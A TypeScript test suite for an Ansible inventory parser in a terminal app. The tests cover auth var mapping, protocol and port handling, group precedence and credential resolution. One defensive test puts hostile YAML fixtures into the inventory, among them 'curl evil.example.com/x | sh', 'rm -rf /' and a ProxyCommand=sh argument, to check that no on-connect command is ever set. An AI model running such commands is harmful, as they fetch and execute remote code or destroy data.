import { describe, it, expect } from 'vitest'
import { parse } from 'yaml'
import { parseAnsibleInventory, protocolFromVars, varsToAuth, groupId, hostId } from './ansible'
import { resolveAuth } from '../../shared/authResolution'
import { applyOverride } from '../../shared/overrides'

const SRC = 'src1'

describe('varsToAuth', () => {
  it('maps the connection vars we understand', () => {
    expect(varsToAuth({ ansible_user: 'deploy', ansible_port: 2222 })).toEqual({
      username: 'deploy',
      port: 2222
    })
  })

  it('accepts the ansible_ssh_* aliases', () => {
    expect(varsToAuth({ ansible_ssh_user: 'root', ansible_ssh_port: '2200' })).toEqual({
      username: 'root',
      port: 2200
    })
  })

  /*
   * Ansible's ssh plugin lists `ansible_user` then `ansible_ssh_user` (and so
   * on for the port, the key and the address), and the later one stated wins.
   */
  it('lets the ansible_ssh_* spelling win when both are stated, as Ansible does', () => {
    expect(
      varsToAuth({
        ansible_user: 'root',
        ansible_ssh_user: 'deploy',
        ansible_port: 22,
        ansible_ssh_port: 2222,
        ansible_private_key_file: '/k/plain',
        ansible_ssh_private_key_file: '/k/ssh'
      })
    ).toEqual({
      username: 'deploy',
      port: 2222,
      privateKeyPath: '/k/ssh',
      authMethod: 'privateKey'
    })
  })

  it('says nothing when the spelling Ansible would use is a template', () => {
    expect(varsToAuth({ ansible_ssh_user: '{{ u }}', ansible_user: 'root' })).toEqual({})
  })

  it('infers key auth from a stated key file', () => {
    expect(varsToAuth({ ansible_ssh_private_key_file: '/k/id' })).toEqual({
      privateKeyPath: '/k/id',
      authMethod: 'privateKey'
    })
  })

  it('takes nothing from a template it cannot resolve', () => {
    expect(
      varsToAuth({
        ansible_user: '{{ deploy_user }}',
        ansible_ssh_private_key_file: '{{ ssh_key }}',
        ansible_port: '{{ port }}'
      })
    ).toEqual({})
    // The alias still counts when the first spelling is a template.
    expect(varsToAuth({ ansible_user: '{{ u }}', ansible_ssh_user: 'deploy' })).toEqual({
      username: 'deploy'
    })
  })

  it('takes nothing from a block or comment template either', () => {
    expect(
      varsToAuth({
        ansible_user: '{% if prod %}root{% else %}deploy{% endif %}',
        ansible_ssh_private_key_file: '{# set by the play #}',
        ansible_port: '{% if prod %}22{% endif %}'
      })
    ).toEqual({})
  })

  it('reads ansible_ssh_host over ansible_host, as Ansible does', () => {
    const { hosts } = parseAnsibleInventory(
      parse(
        'all:\n  hosts:\n    h:\n      ansible_host: 10.0.0.1\n      ansible_ssh_host: 10.0.0.2\n'
      ),
      SRC
    )
    expect(hosts[0].host).toBe('10.0.0.2')
  })

  it('falls back to the host name when ansible_host is a template', () => {
    const { hosts } = parseAnsibleInventory(
      { web: { hosts: { web1: { ansible_host: '{{ lookup("dig", "web1") }}' } } } },
      'src'
    )
    expect(hosts[0].host).toBe('web1')
  })

  it('sets nothing for unrelated or blank vars', () => {
    expect(varsToAuth({ some_var: 'x', ansible_user: '   ' })).toEqual({})
  })
})

describe('protocolFromVars', () => {
  it('reads the protocol the inventory states', () => {
    expect(protocolFromVars({ terminaldeck_protocol: 'rdp' })).toBe('rdp')
    expect(protocolFromVars({ terminaldeck_protocol: 'RDP' })).toBe('rdp')
  })

  /**
   * Undefined, not SSH. A host that says nothing is left without a protocol so
   * an override can still state one; a host that says something we do not speak
   * is treated the same way rather than silently becoming a terminal.
   */
  it('says nothing for an absent or unknown protocol', () => {
    expect(protocolFromVars({})).toBeUndefined()
    expect(protocolFromVars({ terminaldeck_protocol: 'vnc' })).toBeUndefined()
  })

  /** `ansible_connection` is how Ansible manages a box, not how a person uses it. */
  it('does not guess from the Ansible connection plugin', () => {
    expect(protocolFromVars({ ansible_connection: 'winrm' })).toBeUndefined()
  })
})

describe('an inventory that names a protocol', () => {
  const inventory = (body: string) =>
    parseAnsibleInventory(parse(body), SRC).hosts.map((h) => ({
      name: h.name,
      protocol: h.protocol,
      port: h.port
    }))

  it('marks the host the inventory says is a desktop', () => {
    expect(
      inventory(`
all:
  children:
    win:
      hosts:
        dc1:
          terminaldeck_protocol: rdp
`)
    ).toEqual([{ name: 'dc1', protocol: 'rdp', port: undefined }])
  })

  /**
   * Our own groups carry no protocol — only a host knows what it is — but an
   * inventory that states it on a group plainly means every host in it, so the
   * group chain is read while parsing and the answer written onto each host.
   */
  it('takes it from the group when the group is what states it', () => {
    expect(
      inventory(`
all:
  children:
    win:
      vars:
        terminaldeck_protocol: rdp
      hosts:
        dc1:
        dc2:
`)
    ).toEqual([
      { name: 'dc1', protocol: 'rdp', port: undefined },
      { name: 'dc2', protocol: 'rdp', port: undefined }
    ])
  })

  it('lets the host disagree with its group', () => {
    expect(
      inventory(`
all:
  children:
    win:
      vars:
        terminaldeck_protocol: rdp
      hosts:
        jump1:
          terminaldeck_protocol: ssh
`)
    ).toEqual([{ name: 'jump1', protocol: 'ssh', port: undefined }])
  })

  /**
   * The trap this exists for: `ansible_port` is WinRM's, not the desktop's, and
   * carrying it dials the management port for a screen.
   */
  it('drops the Ansible port on a desktop host', () => {
    expect(
      inventory(`
all:
  hosts:
    dc1:
      terminaldeck_protocol: rdp
      ansible_port: 5985
`)
    ).toEqual([{ name: 'dc1', protocol: 'rdp', port: undefined }])
  })

  it('takes terminaldeck_port when the desktop is not on 3389', () => {
    expect(
      inventory(`
all:
  hosts:
    dc1:
      terminaldeck_protocol: rdp
      ansible_port: 5985
      terminaldeck_port: 33890
`)
    ).toEqual([{ name: 'dc1', protocol: 'rdp', port: 33890 }])
  })

  it('leaves an ordinary host exactly as it was', () => {
    expect(
      inventory(`
all:
  hosts:
    web1:
      ansible_port: 2222
`)
    ).toEqual([{ name: 'web1', protocol: undefined, port: 2222 }])
  })
})

describe('parseAnsibleInventory', () => {
  const doc = parse(`
all:
  children:
    web:
      hosts:
        web1:
          ansible_host: 10.0.0.1
        web2: {}
      vars:
        ansible_user: nginx
    db:
      hosts:
        db1:
          ansible_host: 10.0.0.9
          ansible_user: postgres
          ansible_port: 2222
`)

  it('builds a group per Ansible group, nested under all', () => {
    const { groups } = parseAnsibleInventory(doc, SRC)
    expect(groups.map((g) => g.name)).toEqual(['all', 'web', 'db'])
    expect(groups.find((g) => g.name === 'web')!.parentId).toBe(groupId(SRC, 'all'))
  })

  it('puts group vars on the group, so hosts inherit them', () => {
    const { groups } = parseAnsibleInventory(doc, SRC)
    expect(groups.find((g) => g.name === 'web')!.username).toBe('nginx')
  })

  it('reads ansible_host, falling back to the host key', () => {
    const { hosts } = parseAnsibleInventory(doc, SRC)
    expect(hosts.find((h) => h.name === 'web1')!.host).toBe('10.0.0.1')
    expect(hosts.find((h) => h.name === 'web2')!.host).toBe('web2')
  })

  it('leaves host auth unset when the inventory says nothing, so it inherits', () => {
    const { hosts } = parseAnsibleInventory(doc, SRC)
    expect(hosts.find((h) => h.name === 'web1')!.username).toBeUndefined()
  })

  it('keeps host-level overrides', () => {
    const { hosts } = parseAnsibleInventory(doc, SRC)
    const db1 = hosts.find((h) => h.name === 'db1')!
    expect(db1.username).toBe('postgres')
    expect(db1.port).toBe(2222)
  })

  it('gives hosts stable ids derived from the source', () => {
    const { hosts } = parseAnsibleInventory(doc, SRC)
    expect(hosts.find((h) => h.name === 'db1')!.id).toBe(hostId(SRC, 'db1'))
  })

  /**
   * Ansible reads group_vars and host_vars after the inventory's own vars, so
   * the files win: https://docs.ansible.com/ansible/latest/playbook_guide/playbooks_variables.html#understanding-variable-precedence
   */
  it('merges group_vars and host_vars, with the files winning over inline vars', () => {
    const lookup = (kind: 'group' | 'host', name: string): Record<string, unknown> => {
      if (kind === 'group' && name === 'web') return { ansible_user: 'from-group-vars' }
      if (kind === 'host' && name === 'db1') return { ansible_user: 'from-host-vars' }
      return {}
    }
    const { groups, hosts } = parseAnsibleInventory(doc, SRC, lookup)
    // group_vars/web.yml beats `vars:` under web.
    expect(groups.find((g) => g.name === 'web')!.username).toBe('from-group-vars')
    // host_vars/db1.yml beats what db1 states inline.
    expect(hosts.find((h) => h.name === 'db1')!.username).toBe('from-host-vars')
  })

  it('applies host_vars when the inventory states nothing inline', () => {
    // web2 declares no vars of its own, unlike web1 which sets ansible_host.
    const lookup = (kind: 'group' | 'host', name: string): Record<string, unknown> =>
      kind === 'host' && name === 'web2' ? { ansible_host: '192.168.1.5' } : {}
    const { hosts } = parseAnsibleInventory(doc, SRC, lookup)
    expect(hosts.find((h) => h.name === 'web2')!.host).toBe('192.168.1.5')
  })

  it('keeps a host listed twice as one host, belonging to both groups', () => {
    const dup = parse(`
all:
  children:
    a:
      hosts:
        shared: {}
    b:
      hosts:
        shared: {}
`)
    const { hosts, memberships } = parseAnsibleInventory(dup, SRC)
    expect(hosts).toHaveLength(1)
    expect(memberships[hostId(SRC, 'shared')]).toEqual([
      groupId(SRC, 'all/a'),
      groupId(SRC, 'all/b')
    ])
    // Same depth, so the alphabetically last group supplies the settings —
    // which is the one Ansible's own merge order would let win.
    expect(hosts[0].groupId).toBe(groupId(SRC, 'all/b'))
  })

  /**
   * The layout that came back as "the inventory loaded but the groups did
   * not": groups written as siblings of `all` rather than nested under
   * `all.children`, which is how a Kubernetes inventory is ordinarily laid
   * out. Reading `all` and stopping threw every one of them away — and the
   * hosts still appeared, because `all.hosts` lists them too, so the tree
   * looked like it had worked.
   */
  describe('groups written beside "all" rather than under it', () => {
    const beside = parse(`
all:
  hosts:
    m1: { ansible_host: 10.0.0.1 }
    w1: { ansible_host: 10.0.0.2 }
control:
  hosts:
    m1:
  vars:
    ansible_user: root
workers:
  hosts:
    w1:
`)

    it('reads them, as children of all', () => {
      const { groups } = parseAnsibleInventory(beside, SRC)
      expect(groups.map((g) => g.name)).toEqual(['all', 'control', 'workers'])
      expect(groups.find((g) => g.name === 'control')!.parentId).toBe(groupId(SRC, 'all'))
    })

    it('gives each host the group that actually names it', () => {
      const { hosts } = parseAnsibleInventory(beside, SRC)
      expect(hosts.find((h) => h.name === 'm1')!.groupId).toBe(groupId(SRC, 'all/control'))
      expect(hosts.find((h) => h.name === 'w1')!.groupId).toBe(groupId(SRC, 'all/workers'))
    })

    it('lists the host under all and under its own group', () => {
      const { memberships } = parseAnsibleInventory(beside, SRC)
      expect(memberships[hostId(SRC, 'm1')]).toEqual([
        groupId(SRC, 'all'),
        groupId(SRC, 'all/control')
      ])
    })

    it('lets those groups carry the connection settings', () => {
      const { groups } = parseAnsibleInventory(beside, SRC)
      expect(groups.find((g) => g.name === 'control')!.username).toBe('root')
    })
  })

  /**
   * Listed under `all.children`, and written again at the top of the file with
   * its vars: both land on `all/web`, and Ansible takes them as one group.
   */
  describe('a group written down twice', () => {
    const twice = parse(`
all:
  children:
    web:
      hosts:
        w1:
web:
  vars:
    ansible_user: deploy
    terminaldeck_protocol: rdp
  hosts:
    w2:
`)

    it('is one group, not two with one id', () => {
      const { groups } = parseAnsibleInventory(twice, SRC)
      expect(groups.filter((g) => g.id === groupId(SRC, 'all/web'))).toHaveLength(1)
    })

    it('carries the vars of both halves to every host in it', () => {
      const { groups, hosts } = parseAnsibleInventory(twice, SRC)
      expect(groups.find((g) => g.id === groupId(SRC, 'all/web'))!.username).toBe('deploy')
      // The vars arrive after w1 was named; w1 still gets them.
      expect(hosts.map((h) => [h.name, h.protocol])).toEqual([
        ['w1', 'rdp'],
        ['w2', 'rdp']
      ])
    })
  })

  it('handles top-level groups without an "all" wrapper', () => {
    const flat = parse('web:\n  hosts:\n    w1: {}\n')
    const { groups, hosts } = parseAnsibleInventory(flat, SRC)
    expect(groups.map((g) => g.name)).toEqual(['web'])
    expect(hosts.map((h) => h.name)).toEqual(['w1'])
  })

  it('tolerates empty and null sections', () => {
    const sparse = parse('all:\n  children:\n    empty:\n')
    expect(() => parseAnsibleInventory(sparse, SRC)).not.toThrow()
    expect(parseAnsibleInventory(sparse, SRC).hosts).toEqual([])
  })

  it('returns nothing for a non-object document', () => {
    const empty = { groups: [], hosts: [], memberships: {} }
    expect(parseAnsibleInventory(null, SRC)).toEqual(empty)
    expect(parseAnsibleInventory('text', SRC)).toEqual(empty)
  })
})

describe('a host in several groups', () => {
  // The shape that started this: web2 is named by both web and db.
  const doc = parse(`
all:
  children:
    linux:
      children:
        web:
          hosts:
            web1:
              ansible_host: 10.10.10.245
            web2:
              ansible_host: 10.10.10.15
        db:
          hosts:
            db1:
              ansible_host: 10.10.10.13
              ansible_port: 22
            web2:
              ansible_host: 10.10.10.15
      vars:
        ansible_user: max
`)

  it('keeps one host entity, not one per mention', () => {
    const { hosts } = parseAnsibleInventory(doc, SRC)
    expect(hosts.map((h) => h.name).sort()).toEqual(['db1', 'web1', 'web2'])
  })

  it('records every group that names it', () => {
    const { memberships } = parseAnsibleInventory(doc, SRC)
    expect(memberships[hostId(SRC, 'web2')]).toEqual([
      groupId(SRC, 'all/linux/db'),
      groupId(SRC, 'all/linux/web')
    ])
  })

  it('lists a host named once under that group alone', () => {
    const { memberships } = parseAnsibleInventory(doc, SRC)
    expect(memberships[hostId(SRC, 'web1')]).toEqual([groupId(SRC, 'all/linux/web')])
    expect(memberships[hostId(SRC, 'db1')]).toEqual([groupId(SRC, 'all/linux/db')])
  })

  it('inherits from the last group in Ansible order, alphabetically within a level', () => {
    const { hosts } = parseAnsibleInventory(doc, SRC)
    // db and web sit at the same depth, so 'web' is read last and wins.
    expect(hosts.find((h) => h.name === 'web2')?.groupId).toBe(groupId(SRC, 'all/linux/web'))
  })

  it('prefers a deeper group over a shallower one', () => {
    const nested = parse(`
all:
  hosts:
    solo:
      ansible_host: 10.0.0.1
  children:
    zone:
      hosts:
        solo:
          ansible_host: 10.0.0.1
`)
    const { hosts, memberships } = parseAnsibleInventory(nested, SRC)
    expect(memberships[hostId(SRC, 'solo')]).toEqual([
      groupId(SRC, 'all'),
      groupId(SRC, 'all/zone')
    ])
    expect(hosts.find((h) => h.name === 'solo')?.groupId).toBe(groupId(SRC, 'all/zone'))
  })

  it('merges inline vars across mentions, the later one winning', () => {
    const conflicting = parse(`
all:
  children:
    aaa:
      hosts:
        node:
          ansible_host: 10.0.0.1
          ansible_port: 22
    bbb:
      hosts:
        node:
          ansible_host: 10.0.0.99
`)
    const { hosts } = parseAnsibleInventory(conflicting, SRC)
    const node = hosts.find((h) => h.name === 'node')
    expect(node?.host).toBe('10.0.0.99')
    // Only bbb restates the address, so the port from aaa survives the merge.
    expect(node?.port).toBe(22)
  })
})

describe('what an inventory may not set', () => {
  /**
   * onConnectCommand is arbitrary code run on every connection. Honouring it
   * from a repository would give anyone able to commit there command execution
   * on every machine its readers open. The parser must never populate it, no
   * matter what the YAML says — this test is the guard on that.
   */
  it('never populates onConnectCommand, whatever the vars are called', () => {
    const hostile = parse(`
all:
  vars:
    onConnectCommand: "curl evil.example.com/x | sh"
    ansible_onConnectCommand: "curl evil.example.com/x | sh"
    on_connect_command: "curl evil.example.com/x | sh"
    ansible_shell_command: "curl evil.example.com/x | sh"
  children:
    web:
      vars:
        onConnectCommand: "rm -rf /"
      hosts:
        w1:
          ansible_host: 10.0.0.1
          onConnectCommand: "rm -rf /"
          ansible_ssh_extra_args: "-o ProxyCommand=sh"
`)
    const { groups, hosts } = parseAnsibleInventory(hostile, SRC)
    for (const item of [...groups, ...hosts]) {
      expect(item.onConnectCommand).toBeUndefined()
    }
  })

  it('maps only the connection vars it knows, ignoring the rest', () => {
    expect(
      varsToAuth({
        ansible_user: 'deploy',
        onConnectCommand: 'sudo -i',
        fileAccess: { protocol: 'scp', shell: 'sudo -n -i -u root' },
        ansible_become: true,
        ansible_python_interpreter: '/usr/bin/python3'
      })
    ).toEqual({ username: 'deploy' })
  })
})

describe('inherited desktop protocol', () => {
  it('reads protocol and desktop port from ancestors of a host group', () => {
    const result = parseAnsibleInventory(
      parse(`
all:
  vars:
    terminaldeck_protocol: rdp
    terminaldeck_port: 3390
  children:
    windows:
      children:
        domain:
          hosts:
            dc1:
`),
      SRC
    )
    expect(result.hosts[0]).toMatchObject({ protocol: 'rdp', port: 3390 })
  })
  it('lets a nearer group override an ancestor protocol', () => {
    const result = parseAnsibleInventory(
      parse(`
all:
  vars:
    terminaldeck_protocol: rdp
  children:
    linux:
      vars:
        terminaldeck_protocol: ssh
      hosts:
        web:
`),
      SRC
    )
    expect(result.hosts[0].protocol).toBe('ssh')
  })
  it.each(['{{ ssh_port }}', '$ANSIBLE_VAULT;1.1;AES256\n6162'])(
    'leaves a port Ansible resolves at run time unset: %s',
    (value) => {
      expect(varsToAuth({ ansible_port: value })).toEqual({})
    }
  )
  it.each(['Infinity', '-1', '0', '65536', '22.5', 'oops'])('refuses invalid port %s', (value) => {
    expect(() => varsToAuth({ ansible_port: value })).toThrow('Inventory port')
    expect(() =>
      parseAnsibleInventory(
        { all: { hosts: { desktop: { terminaldeck_protocol: 'rdp', terminaldeck_port: value } } } },
        SRC
      )
    ).toThrow('Inventory port')
  })
})

/**
 * A host inherits along one chain of groups, and Ansible reads every group
 * the host is in and all their parents. What the chain does not reach is
 * carried on the host where Ansible would take it from elsewhere.
 */
describe('settings from a group off the host’s own chain', () => {
  function connects(doc: string, name: string): { username?: string; port: number } {
    const { groups, hosts } = parseAnsibleInventory(parse(doc), SRC)
    const host = hosts.find((h) => h.name === name)!
    const { username, port } = resolveAuth(host, host.groupId ?? null, groups)
    return { username: username || undefined, port }
  }

  it('reaches a host through the other parent of its group', () => {
    const doc = `
all:
  children:
    prod:
      vars: { ansible_user: deploy, ansible_port: 2222 }
      children:
        web:
          hosts: { h: {} }
    stage:
      children:
        web: {}
`
    expect(connects(doc, 'h')).toEqual({ username: 'deploy', port: 2222 })
  })

  it('carries nothing the chain itself wins', () => {
    const doc = `
all:
  children:
    prod:
      vars: { ansible_user: deploy }
      children:
        web:
          hosts: { h: {} }
    stage:
      vars: { ansible_user: staging }
      children:
        web: {}
`
    const { hosts } = parseAnsibleInventory(parse(doc), SRC)
    // stage is read after prod, and the chain runs through stage.
    expect(hosts[0].carriedAuth).toBeUndefined()
    expect(connects(doc, 'h').username).toBe('staging')
  })

  it('takes a setting from another group the host is in', () => {
    const doc = `
all:
  children:
    db:
      vars: { ansible_port: 2200 }
      hosts: { h: {} }
    web:
      hosts: { h: {} }
`
    expect(connects(doc, 'h').port).toBe(2200)
  })

  /*
   * Copied when the repository was read, a carried setting went on saying
   * what db said then: local settings given to db never reached h.
   */
  it('reads a carried setting from its group as the group is now', () => {
    const { groups, hosts } = parseAnsibleInventory(
      parse(`
all:
  children:
    db:
      vars: { ansible_user: deploy, ansible_port: 2200 }
      hosts: { h: {} }
    web:
      hosts: { h: {} }
`),
      SRC
    )
    const db = groupId(SRC, 'all/db')
    const local = groups.map((g) =>
      applyOverride(g, g.id === db ? { nodeId: db, username: 'local' } : undefined)
    )
    const h = hosts[0]
    expect(resolveAuth(h, h.groupId ?? null, local)).toMatchObject({
      username: 'local',
      port: 2200
    })
    // A group gone from the tree leaves the copy to speak for it.
    expect(
      resolveAuth(
        h,
        h.groupId ?? null,
        local.filter((g) => g.id !== db)
      ).username
    ).toBe('deploy')
  })

  /* The account chosen for db in its local settings is part of the login h takes from db. */
  it('takes the account of the group its login is carried from', () => {
    const { groups, hosts } = parseAnsibleInventory(
      parse(`
all:
  children:
    db:
      vars: { ansible_user: deploy }
      hosts: { h: {} }
    web:
      hosts: { h: {} }
`),
      SRC
    )
    const db = groupId(SRC, 'all/db')
    const local = groups.map((g) =>
      applyOverride(g, g.id === db ? { nodeId: db, credentialId: 'admin' } : undefined)
    )
    const credentials = [
      {
        id: 'admin',
        name: 'Admin',
        username: 'admin',
        authMethod: 'password' as const,
        secretRef: 's1',
        createdAt: 0,
        updatedAt: 0
      }
    ]
    const h = hosts[0]
    expect(resolveAuth(h, h.groupId ?? null, local, { credentials })).toMatchObject({
      username: 'admin',
      secretRef: 's1'
    })
  })

  /*
   * The secret saved for db is the passphrase of db's key. Carried with the
   * login and without the key, it was sent to the server as a password.
   */
  it('carries a group’s saved secret only with the way it signs in', () => {
    const { groups, hosts } = parseAnsibleInventory(
      parse(`
all:
  children:
    db:
      vars: { ansible_user: deploy }
      hosts: { h: {} }
    web:
      hosts: { h: {} }
`),
      SRC
    )
    const db = groupId(SRC, 'all/db')
    const h = hosts[0]
    const withLocal = (local: Record<string, unknown>) =>
      resolveAuth(
        h,
        h.groupId ?? null,
        groups.map((g) => applyOverride(g, g.id === db ? { nodeId: db, ...local } : undefined))
      )

    expect(
      withLocal({ authMethod: 'privateKey', privateKeyPath: '/keys/encrypted', secretRef: 'pp' })
    ).toMatchObject({
      username: 'deploy',
      authMethod: 'privateKey',
      privateKeyPath: '/keys/encrypted',
      secretRef: 'pp'
    })
    // A secret saved without saying how it is used stays with db's own hosts.
    expect(withLocal({ secretRef: 'pw' }).secretRef).toBeUndefined()
  })

  /* The way in comes whole from one group, whichever groups the login and the key are from. */
  describe('when the login and the key come from different groups', () => {
    const resolveWith = (doc: string, local: Record<string, Record<string, unknown>>) => {
      const { groups, hosts } = parseAnsibleInventory(parse(doc), SRC)
      const h = hosts[0]
      return resolveAuth(
        h,
        h.groupId ?? null,
        groups.map((g) => {
          const name = Object.keys(local).find((n) => g.id === groupId(SRC, `all/${n}`))
          return applyOverride(g, name ? { nodeId: g.id, ...local[name] } : undefined)
        })
      )
    }

    it('takes the secret from the group the method comes from', () => {
      const auth = resolveWith(
        `
all:
  children:
    a: { vars: { ansible_user: deploy }, hosts: { h: {} } }
    b: { vars: { ansible_private_key_file: /keys/b }, hosts: { h: {} } }
    z: { hosts: { h: {} } }
`,
        {
          a: { authMethod: 'privateKey', privateKeyPath: '/keys/a', secretRef: 'pp-a' },
          b: { authMethod: 'password', secretRef: 'password-b' }
        }
      )
      expect(auth).toMatchObject({
        username: 'deploy',
        authMethod: 'password',
        secretRef: 'password-b'
      })
    })

    it('brings the passphrase saved with a key carried without the login', () => {
      const auth = resolveWith(
        `
all:
  children:
    db: { vars: { ansible_private_key_file: /keys/encrypted }, hosts: { h: {} } }
    web: { vars: { ansible_user: deploy }, hosts: { h: {} } }
`,
        { db: { authMethod: 'privateKey', secretRef: 'pp-db' } }
      )
      expect(auth).toMatchObject({
        username: 'deploy',
        authMethod: 'privateKey',
        privateKeyPath: '/keys/encrypted',
        secretRef: 'pp-db'
      })
    })
  })

  it('still lets the host’s own settings win', () => {
    const doc = `
all:
  children:
    db:
      vars: { ansible_port: 2200 }
      hosts: { h: {} }
    web:
      hosts: { h: { ansible_port: 22 } }
`
    expect(connects(doc, 'h').port).toBe(22)
  })
})
